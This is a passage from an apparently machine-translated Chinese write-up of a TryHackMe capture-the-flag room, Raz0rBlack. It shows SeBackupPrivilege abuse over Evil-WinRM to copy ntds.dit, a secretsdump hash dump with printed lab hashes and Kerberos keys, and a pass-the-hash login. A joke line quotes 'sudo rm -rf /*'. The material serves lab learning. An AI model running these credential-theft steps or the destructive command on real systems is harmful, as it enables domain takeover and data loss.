SeBackupPrivilegeUtils.dll<br/><br/>*Evil-WinRM* PS C:\tmp&gt; upload SeBackupPrivilegeCmdLets.dll<br/><br/>*Evil-WinRM* PS C:\tmp&gt; import-module .\SeBackupPrivilegeUtils.dll<br/><br/>*Evil-WinRM* PS C:\tmp&gt; import-module .\SeBackupPrivilegeCmdLets.dll<br/><br/>*Evil-WinRM* PS C:\tmp&gt; copy-filesebackupprivilege h:\windows\ntds\ntds.dit C:\tmp\ntds.dit -overwrite<br/><br/>*Evil-WinRM* PS C:\tmp&gt; reg save HKLM\SYSTEM C:\tmp\system<br/><br/>*Evil-WinRM* PS C:\tmp&gt; download ntds.dit<br/><br/>*Evil-WinRM* PS C:\tmp&gt; download system</span></pre><p id="83b7" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated">现在转储哈希值。</p><pre class="kg kh ki kj gt ny nz oa ob aw oc bi"><span id="2806" class="od ko iq nz b gy oe of l og oh">- python3 /opt/impacket/examples/secretsdump.py -system system -ntds ntds.dit LOCAL</span><span id="0bca" class="od ko iq nz b gy pe of l og oh"><br/><strong class="nz ir">Administrator:500:aad3b435b51404eeaad3b435b51404ee:9689931bed40ca5a2ce1218210177f0c:::</strong><br/>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br/>HAVEN-DC$:1000:aad3b435b51404eeaad3b435b51404ee:26cc019045071ea8ad315bd764c4f5c6:::<br/>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:fa3c456268854a917bd17184c85b4fd1:::<br/>raz0rblack.thm\xyan1d3:1106:aad3b435b51404eeaad3b435b51404ee:bf11a3cbefb46f7194da2fa190834025:::<br/>raz0rblack.thm\lvetrova:1107:aad3b435b51404eeaad3b435b51404ee:f220d3988deb3f516c73f40ee16c431d:::<br/>raz0rblack.thm\sbradley:1108:aad3b435b51404eeaad3b435b51404ee:351c839c5e02d1ed0134a383b628426e:::<br/>raz0rblack.thm\twilliams:1109:aad3b435b51404eeaad3b435b51404ee:351c839c5e02d1ed0134a383b628426e:::<br/>[*] Kerberos keys from ntds.dit <br/>Administrator:aes256-cts-hmac-sha1-96:ab77c0dd6f5a28b63c4ae5f0eb89ad48f3ed43d52dc42f1dca2e99d8fc9cdbbf<br/>Administrator:aes128-cts-hmac-sha1-96:81a749369e929b7f1731489b12a49df8<br/>Administrator:des-cbc-md5:d3b646b65bceb5c7<br/>HAVEN-DC$:aes256-cts-hmac-sha1-96:d6b41169e02a4543b90a8c697b167948413397c30f1bf5f0199a54f387358fc6<br/>HAVEN-DC$:aes128-cts-hmac-sha1-96:5ed5bd57484ca826e09afa6e5b944c27<br/>HAVEN-DC$:des-cbc-md5:f71a0dc89b9d079d<br/>krbtgt:aes256-cts-hmac-sha1-96:eed4acbdf1b6cc2b3c1aef992a8cea74d8b0c4ad5b4deecf47c57c4d9465caf5<br/>krbtgt:aes128-cts-hmac-sha1-96:3dbbd202aa0343d1b8df99785d2befbb<br/>krbtgt:des-cbc-md5:857a46f13e91eae3<br/>raz0rblack.thm\xyan1d3:aes256-cts-hmac-sha1-96:6de380d21ae165f55e7520ee3c4a81417bf6a25b17f72ce119083846d89a031f<br/>raz0rblack.thm\xyan1d3:aes128-cts-hmac-sha1-96:9f5a0114b2c18ea63a32a1b8553d4f61<br/>raz0rblack.thm\xyan1d3:des-cbc-md5:e9a1a46223cd8975<br/>raz0rblack.thm\lvetrova:aes256-cts-hmac-sha1-96:3809e38e24ecb746dc0d98e2b95f39fc157de38a9081b3973db5be4c25d5ad39<br/>raz0rblack.thm\lvetrova:aes128-cts-hmac-sha1-96:3676941361afe1800b8ab5d5a15bd839<br/>raz0rblack.thm\lvetrova:des-cbc-md5:385d6e1f1cc17fb6<br/>raz0rblack.thm\sbradley:aes256-cts-hmac-sha1-96:ddd43169c2235d3d2134fdb2ff4182abdb029a20724e679189a755014e68bab5<br/>raz0rblack.thm\sbradley:aes128-cts-hmac-sha1-96:7cdf6640a975c86298b9f48000047580<br/>raz0rblack.thm\sbradley:des-cbc-md5:83fe3e584f4a5bf8<br/>raz0rblack.thm\twilliams:aes256-cts-hmac-sha1-96:05bac51a4b8888a484e0fa1400d8f507b195c4367198024c6806d8eb401cb559<br/>raz0rblack.thm\twilliams:aes128-cts-hmac-sha1-96:a37656829f443e3fe2630aa69af5cb5a<br/>raz0rblack.thm\twilliams:des-cbc-md5:01e958b0ea6edf07</span></pre><p id="8077" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated">最后，从这里我们得到管理员散列。我们可以用这个通过<code class="fe oj ok ol nz b">Evil-WinRM</code>登录系统</p><pre class="kg kh ki kj gt ny nz oa ob aw oc bi"><span id="bffb" class="od ko iq nz b gy oe of l og oh">evil-winrm -i $IP -u administrator -H 9689931bed40ca5a2ce1218210177f0c</span></pre><p id="47d4" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated"><strong class="lh ir">得到旗帜。</strong></p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="pg ph di pi bf pj"><div class="gh gi pf"><img src="../Images/f81f29490ce4be15cb03a4d9b68715c6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*vuc9jFtoQAugCIzUsVHLTQ.png"/></div></div></figure><p id="ac2f" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated">在密码字段中，我们得到一个长字符串。让我们用赛博网破解它。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="pg ph di pi bf pj"><div class="gh gi pf"><img src="../Images/a5246c03a89b82317beb90390274248c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*OML-CVRf5erU3mF52Xzpww.png"/></div></div></figure><h1 id="cb8f" class="kn ko iq bd kp kq kr ks kt ku kv kw kx jw ky jx kz jz la ka lb kc lc kd ld le bi translated">9:泰森的旗帜是什么？</h1><p id="cb24" class="pw-post-body-paragraph lf lg iq lh b li lj jr lk ll lm ju ln lo lp lq lr ls lt lu lv lw lx ly lz ma ij bi translated">我们可以转到Tyson主文件夹，找到一个很长的带标志的可执行文件</p><pre class="kg kh ki kj gt ny nz oa ob aw oc bi"><span id="0363" class="od ko iq nz b gy oe of l og oh">PS C:\users\twilliams&gt; type .\definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_not_a_flag.exe</span></pre><h1 id="387a" class="kn ko iq bd kp kq kr ks kt ku kv kw kx jw ky jx kz jz la ka lb kc lc kd ld le bi translated">10:完整的绝密是什么？</h1><p id="1fc0" class="pw-post-body-paragraph lf lg iq lh b li lj jr lk ll lm ju ln lo lp lq lr ls lt lu lv lw lx ly lz ma ij bi translated">浏览目录后，我们找到一个名为<code class="fe oj ok ol nz b">"C:\Program Files\Top Secret"</code>的文件夹</p><p id="330d" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated">那个文件夹里有一张图片。我们可以下载下来分析国旗。</p><p id="72e1" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated">通过看图很明显这里的答案是<code class="fe oj ok ol nz b">:wq</code></p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi pk"><img src="../Images/154634537ddb8833b35647ba66f60862.png" data-original-src="https://miro.medium.com/v2/resize:fit:1174/format:webp/1*oUhSAg6usxzLXlY7b_3R0Q.png"/></div></figure><p id="3bee" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated">你喜欢你的饼干吗？</p><p id="da94" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated">说好，否则我会在你的电脑上做<code class="fe oj ok ol nz b">sudo rm -rf /*</code></p><p id="2309" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated">现在你可以选择如何回答这个问题😂</p><blockquote class="pl"><p id="134b" class="pm pn iq bd po pp pq pr ps pt pu ma dk translated">恭喜你完成了房间！💥</p></blockquote><p id="18f1" class="pw-post-body-paragraph lf lg iq lh b li pv jr lk ll pw ju ln lo px lq lr ls py lu lv lw pz ly lz ma ij bi translated">非常感谢你的阅读。喜欢就分享</p><p id="56d1" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated">可以在推特上找我:<a class="ae oi" href="https://twitter.com/mayank_pandey01" rel="noopener ugc nofollow" target="_blank"> <strong class="lh ir"> mayank_pandey01 </strong> </a></p></div></div>    
</body>
</html>